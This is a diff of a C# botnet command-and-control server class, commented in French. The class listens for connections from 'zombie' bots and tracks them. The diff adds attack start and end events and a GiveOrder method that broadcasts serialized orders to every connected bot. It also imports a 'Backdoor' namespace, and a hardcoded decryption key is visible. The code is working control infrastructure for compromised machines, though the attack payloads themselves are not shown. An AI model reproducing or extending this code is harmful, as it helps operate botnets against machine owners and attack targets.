@@ -2,11 +2,13 @@ using System ;
 using System.Net;
 using System.Net.Sockets ;
 using System.Collections ;
-using System.Collections.Generic ; 
+using System.Collections.Generic ;
+using System.Timers;
 using System.Threading ;
 using System.Text;
 
-using BotnetAPP.Shared ; 
+using BotnetAPP.Shared ;
+using LegitimeAPP.Backdoor;
 
 
 /*
@@ -20,14 +22,18 @@ namespace BotnetAPP.Network {
     public class Connection {
 
         private readonly int _listenPort = 2401 ; 
-        private readonly int _timeOut = 5000 ;
         private readonly string _decryptionCode = "pCw0bX$7OLQEI1!o^y%nc3^#";
+        private Boolean _ongoingAttack ; 
+        private Dictionary<Zombie, Socket> _connectedBot ;
+        
 
-        private Dictionary<Zombie, Socket> _connectedBot ; 
+
         // Event
-
         public event EventConnectionHandler NewConnectedBot;
-        public event EventConnectionHandler NewDisconnectionBot ; 
+        public event EventConnectionHandler NewDisconnectionBot ;
+        public event EventConnectionHandler NewAttack ;
+        public event EventConnectionHandler EndAttack ;
+
 
 
         // Thread
@@ -43,16 +49,22 @@ namespace BotnetAPP.Network {
             }
         }
 
-
-    // getter et 
+    // méthode permettant de déclencher les événements 
+    public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
+    public void OnDisconnectionBot(Zombie zombie) => NewDisconnectionBot?.Invoke(zombie);
+    public void OnNewAttack(Zombie zombie) => NewAttack?.Invoke(zombie) ;
+    public void OnEndAttack(Zombie zombie) => EndAttack?.Invoke(zombie) ;
 
     public Connection() {
 
+        // Initialisation de la liste contenant les utilisateurs connectés 
+        _connectedBot = new() ;
 
-        _connectedBot = new() ; 
 
+        _ongoingAttack = false ;
 
-        // Initialisation des threads et démarrage 
+        // Initialisation des threads et démarrage
+
         _checkingConnectionRequest = new Thread(ListenConnectionRequest) ;
         _checkingBotDisconnection = new Thread(CheckBotsDisconnections) ; 
 
@@ -63,18 +75,6 @@ namespace BotnetAPP.Network {
         _checkingConnectionRequest.Start() ;
         _checkingBotDisconnection.Start() ; 
 
-    }
-
-
-
-
-
-    public void OnNewConnectedBot(Zombie zombie) {
-        NewConnectedBot?.Invoke(zombie);
-    }
-
-    public void OnDisconnectionBot(Zombie zombie) {
-        NewDisconnectionBot?.Invoke(zombie); 
     }
 
     /*
@@ -93,18 +93,33 @@ namespace BotnetAPP.Network {
                 return resultat ; 
         }
     
-    private void WriteNetMessage (string message, Socket s) {
-        // A écrire pour simplifier le processus de communication
+    // A écrire pour simplifier le processus de communication
+    private void WriteNetMessage (string message, Socket s) => s.Send(_asen.GetBytes(message)) ;
 
-        s.Send(_asen.GetBytes(message)) ;
+
+    // Envoie un message a tout les bots connectés 
+    private void BroadcastNetMessage (string message) {
+        foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
+            WriteNetMessage( message,item.Value) ; 
+        }
     }
+        
+    
 
+
+    public void GiveOrder(Order order) {
+
+
+       // Console.WriteLine("test") ; 
+     //  Console.WriteLine(Data<Order>.DataToXml(order)) ; 
+
+        BroadcastNetMessage(Data<Order>.DataToXml(order)) ; 
+    }
+ 
     
         
-    private bool SocketConnected(Socket s)
-    {
-        return !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);
-    }
+    private bool SocketConnected(Socket s) => !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);
+
 
 
     public void CheckBotsDisconnections() {
@@ -136,11 +151,6 @@ namespace BotnetAPP.Network {
         Ecoute les demandes de connexions 
         */
 
-
-
-    public void SendOrder() {
-        
-    }
 
 
     public void ListenConnectionRequest() {
